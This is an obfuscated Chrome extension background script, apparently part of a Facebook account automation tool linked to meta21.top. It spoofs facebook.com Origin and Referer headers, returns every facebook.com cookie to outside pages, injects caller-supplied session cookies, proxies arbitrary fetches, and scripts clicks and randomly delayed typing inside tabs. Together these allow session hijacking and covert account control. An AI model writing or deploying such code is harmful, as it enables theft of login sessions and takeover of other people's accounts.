
chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: 1,
      action: {
        type: "modifyHeaders",
        requestHeaders: [{
          header: "Origin",
          operation: "set",
          value: "https://www.facebook.com"
        }, {
          header: "Referer",
          operation: "set",
          value: "https://www.facebook.com"
        }]
      },
      condition: {
        initiatorDomains: [chrome.runtime.id],
        urlFilter: "facebook.com",
        resourceTypes: ["xmlhttprequest"]
      }
    }],
    removeRuleIds: [1]
  });
  chrome.runtime.onMessageExternal.addListener(async function (_0x5d0692, _0x21c799, _0x3cdec1) {
    if (_0x5d0692.type === "fetch") {
      try {
        const _0x41e858 = await fetch(_0x5d0692.url, _0x5d0692.options);
        const _0x5e4bc6 = await _0x41e858.text();
        let _0x521a93 = false;
        try {
          _0x521a93 = JSON.parse(_0x5e4bc6);
        } catch {}
        _0x3cdec1({
          url: _0x41e858.url,
          json: _0x521a93,
          text: _0x5e4bc6
        });
      } catch (_0x3ac521) {
        console.log(_0x3ac521);
        _0x3cdec1({
          error: _0x3ac521.toString()
        });
      }
    } else if (_0x5d0692.type === "checkUser") {
      const _0x5784d5 = await fetch("https://meta21.top/client/user");
      const _0x518263 = await _0x5784d5.json();
      _0x3cdec1(_0x518263);
    } else if (_0x5d0692.type === "getVersion") {
      _0x3cdec1(chrome.runtime.getManifest().version);
    } else if (_0x5d0692.type === "getVersionTxt") {
      try {
        const _0x26b864 = await fetch(chrome.runtime.getURL("ver.txt"));
        const _0x1a0e55 = await _0x26b864.text();
        _0x3cdec1("1.6.1");
      } catch {
        _0x3cdec1(false);
      }
    } else if (_0x5d0692.type === "getKey") {
      _0x3cdec1(chrome.runtime.getManifest().author);
    } else if (_0x5d0692.type === "getCookie") {
      chrome.cookies.getAll({
        domain: "facebook.com"
      }, function (_0x11065c) {
        const _0x4a519d = _0x11065c.map(_0x417841 => _0x417841.name + "=" + _0x417841.value).join("; ");
        _0x3cdec1(_0x4a519d);
      });
    } else if (_0x5d0692.type === "emptyCookie") {
      chrome.cookies.getAll({
        domain: _0x5d0692.domain
      }, function (_0x2feef0) {
        _0x2feef0.forEach(_0x394627 => {
          chrome.cookies.remove({
            url: "https://" + _0x394627.domain + _0x394627.path,
            name: _0x394627.name
          });
        });
        _0x3cdec1();
      });
    } else if (_0x5d0692.type === "setCookie") {
      _0x5d0692.cookie.split(";").filter(_0x323e31 => _0x323e31).forEach(_0x4cf241 => {
        const [_0x16c89c, _0x20cd34] = _0x4cf241.split("=").map(_0xf50bde => _0xf50bde.trim());
        chrome.cookies.set({
          url: "https://www.facebook.com",
          domain: ".facebook.com",
          name: _0x16c89c,
          value: _0x20cd34
        });
      });
      _0x3cdec1();
    } else if (_0x5d0692.type === "newTab") {
      chrome.tabs.create({
        url: _0x5d0692.url
      });
      _0x3cdec1();
    }
    else if (_0x5d0692.type === "newTabwin") {
      try {
          chrome.windows.getCurrent((currentWindow) => {
  
              let popupWidth = _0x5d0692.popupWidth;
              let popupHeight = _0x5d0692.popupHeight;
  
              let left = _0x5d0692.left || 0;
              let top = _0x5d0692.top || 0;
  
              chrome.windows.create({
                  url: _0x5d0692.url,
                  type: "popup",
                  width: popupWidth,
                  height: popupHeight,
                  left: Math.round(left), 
                  top: Math.round(top)    
              }, (win) => {
                  if (win && win.tabs && win.tabs.length > 0) {
                      let tabId = win.tabs[0].id;
  
                      chrome.tabs.onUpdated.addListener(function listener(updatedTabId, changeInfo) {
                          if (updatedTabId === tabId && changeInfo.status === "complete") {
                              chrome.tabs.onUpdated.removeListener(listener);
                              _0x3cdec1({ tabId: tabId });
                          }
                      });
  
                  } else {
                      _0x3cdec1({ error: "Không lấy được tabId!" });
                  }
              });
          });
      } catch (error) {
          _0x3cdec1({ error: "Lỗi khi mở tab mới" });
      }
      return true;
  }
  else if (_0x5d0692.type === "clickbutton") {
      let tabId = _0x5d0692.tabId;
      let selector = _0x5d0692.selector; 
  
      chrome.scripting.executeScript({
          target: { tabId },
          args: [selector],
          func: (xpath) => {
              let attempts = 0;
              const maxAttempts = 20; 
              return new Promise((resolve) => {
                  const interval = setInterval(() => {
  
                      let buttons = document.evaluate(xpath, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
                      let buttonCount = buttons.snapshotLength;
                      console.log(buttonCount);
                      if (buttonCount >= 16 && buttonCount <= 17) {
                          if (buttonCount > 12) {
                              buttons.snapshotItem(12).click();
                          } else {
                          }
                          clearInterval(interval);
                          resolve({ success: true });
                      } else if (buttonCount >= 18) {
                          if (buttonCount > 15) {
                              buttons.snapshotItem(15).click(); 
                          } else {
                          }
                          clearInterval(interval);
                          resolve({ success: true });
                      } else if (buttonCount === 1) {
                          buttons.snapshotItem(0).click(); 
                          clearInterval(interval);
                          resolve({ success: true });
                      } else if (attempts >= maxAttempts) {
                          clearInterval(interval);
                          resolve({ error: "Không tìm thấy nút!" });
                      }
                      attempts++;
                  }, 500);
              });
          }
      }, (result) => {
          if (result && result[0] && result[0].result) {
              _0x3cdec1(result[0].result);
          } else {
              _0x3cdec1({ error: "Không nhận được phản hồi từ executeScript!" });
          }
      });
      return true;
  }
  
  
  else if (_0x5d0692.type === "inputtext") {
      let tabId = _0x5d0692.tabId;
      let selector = _0x5d0692.selector;
      let text = _0x5d0692.text; 
      chrome.scripting.executeScript({
          target: { tabId },
          args: [selector, text],
          func: (selector, text) => {
              let attempts = 0;
              const maxAttempts = 20;
              return new Promise((resolve) => {
                  const interval = setInterval(() => {
                      let xpath = selector; 
                      let input = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
                      if (input) {
                          clearInterval(interval);
  
                          input.value = "";
                          input.dispatchEvent(new Event('input', { bubbles: true }));
                          let index = 0;
                          const typeText = () => {
                              if (index < text.length) {
                                  input.value += text[index]; 
                                  input.dispatchEvent(new Event('input', { bubbles: true }));
                                  index++;
  
                                  setTimeout(typeText, Math.random() * 100 + 10); 
                              } else {
  
                                  resolve({ success: true });
                              }
                          };
                          typeText(); 
                      } else if (attempts >= maxAttempts) {
                          clearInterval(interval);
  
                          resolve({ error: "Không tìm thấy ô nhập liệu!" });
                      }
                      attempts++;
                  }, 500);
              });
          }
      }, (result) => {
          if (result && result[0] && result[0].result) {
              _0x3cdec1(result[0].result);
          } else {
              _0x3cdec1({ error: "Không nhận được phản hồi từ executeScript!" });
          }
          _0x3cdec1();
      });
      return true;
  }
  
  else if (_0x5d0692.type === "getPageContent") {
      let tabId = _0x5d0692.tabId;
  
      if (!tabId || isNaN(tabId)) {
  
          _0x3cdec1({ error: "tabId không hợp lệ!" });
          return;
      }
  
      chrome.scripting.executeScript(
          {
              target: { tabId: tabId },
              func: () => document.body.innerText,
          }
      ).then((results) => {
          if (results && results.length > 0) {
  
              _0x3cdec1({ content: results[0].result });
          } else {
  
              _0x3cdec1({ error: "Không lấy được nội dung trang!" });
          }
      }).catch((error) => {
  
          _0x3cdec1({ error: error._0x5d0692 });
      });
  
      return true;
  }
  
  else if (_0x5d0692.type === "closeTab") {
      let tabId = _0x5d0692.tabId;
  
      if (!tabId || isNaN(tabId)) {
          return;
      }
  
      chrome.scripting.executeScript(
          {
              target: { tabId: tabId },
              func: () => {
  
                  window.onbeforeunload = null;
                  window.onunload = null;
                  document.open();
                  document.write("<html><body><script>window.close();</script></body></html>");
                  document.close();
                  setTimeout(() => {
                      window.stop();
                  }, 500);
              },
          },
          () => {
              chrome.tabs.remove(tabId, () => {
              });
          }
      );
      return true;
  }
  else if (_0x5d0692.type === "checkxpath") {
      let tabId = _0x5d0692.tabId;
      let selector = _0x5d0692.selector; 
      chrome.scripting.executeScript({
          target: { tabId },
          args: [selector],
          func: (xpath) => {
              let attempts = 0;
              const maxAttempts = 30; 
              return new Promise((resolve) => {
                  const interval = setInterval(() => {
                      console.log(`Attempt ${attempts + 1}/${maxAttempts}`); 
                      let button = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
  
                      if (button) {
                          clearInterval(interval);
                          resolve({ success: true });
                      } else if (attempts >= maxAttempts) {
                          clearInterval(interval);
                          resolve({ error: "Không tìm thấy nút!" });
                      }
                      attempts++;
                  }, 500);
              });
          }
      }, (result) => {
          if (result && result[0] && result[0].result) {
              _0x3cdec1(result[0].result); 
          } else {
              _0x3cdec1({ error: "Không nhận được phản hồi từ executeScript!" });
          }
          _0x3cdec1();
      });
      return true;
  }
  
    else if (_0x5d0692.type === "getAllLocalStore") {
      chrome.storage.local.get(null, function (_0x2c6cdc) {
        _0x3cdec1(_0x2c6cdc);
      });
    } else if (_0x5d0692.type === "setLocalStorage") {
      chrome.storage.local.set({
        [_0x5d0692.key]: _0x5d0692.data
      }, _0x3cdec1);
    } else if (_0x5d0692.type === "removeLocalStorage") {
      chrome.storage.local.remove([_0x5d0692.name], _0x3cdec1);
    } else if (_0x5d0692.type === "getLocalStorage") {
      chrome.storage.local.get(_0x5d0692.name, function (_0x3c941d) {
        _0x3cdec1(_0x3c941d[_0x5d0692.name]);
      });
    } else if (_0x5d0692.type === "clearLocalStorage") {
      chrome.storage.local.clear(_0x3cdec1);
    } else if (_0x5d0692.type === "reloadExtension") {
      chrome.runtime.reload();
      _0x3cdec1();
    }
  });
  chrome.runtime.onMessage.addListener((_0x3fd47e, _0xe304ed, _0x1b26fe) => {
    if (_0x3fd47e.action == "BGrequest") {
      fetch(_0x3fd47e.url).then(_0x2808b1 => _0x2808b1.json()).then(_0x4adc13 => {
        _0x1b26fe(_0x4adc13);
      });
      return true;
    }
  });
  chrome.runtime.onInstalled.addListener(() => {
    chrome.windows.getAll({
      populate: true
    }, _0x10f7eb => {
      for (const _0x2dc378 of _0x10f7eb) {
        if (_0x2dc378.type === "popup") {
          chrome.windows.remove(_0x2dc378.id);
        }
      }
    });
  });
  chrome.action.onClicked.addListener(async () => {
    const [_0x166dc0] = await chrome.tabs.query({
      active: true,
      currentWindow: true
    });
    const _0x4ee9f1 = "https://ex.meta21.top";
    chrome.windows.getAll({
      populate: true
    }, _0x54e2d5 => {
      let _0x370392 = null;
      for (const _0x2ca093 of _0x54e2d5) {
        if (_0x2ca093.tabs.some(_0x45ecd => _0x45ecd.url === _0x4ee9f1)) {
          _0x370392 = _0x2ca093;
          break;
        }
      }
      if (_0x370392) {
        if (_0x370392.state === "minimized") {
          chrome.windows.update(_0x370392.id, {
            state: "normal"
          });
        } else {
          chrome.windows.update(_0x370392.id, {
            state: "minimized"
          });
        }
      } else {
        chrome.windows.create({
          url: _0x4ee9f1,
          type: "popup",
          height: 800,
          width: 1400,
          top: 200,
          left: 200
        });
      }
    });
});
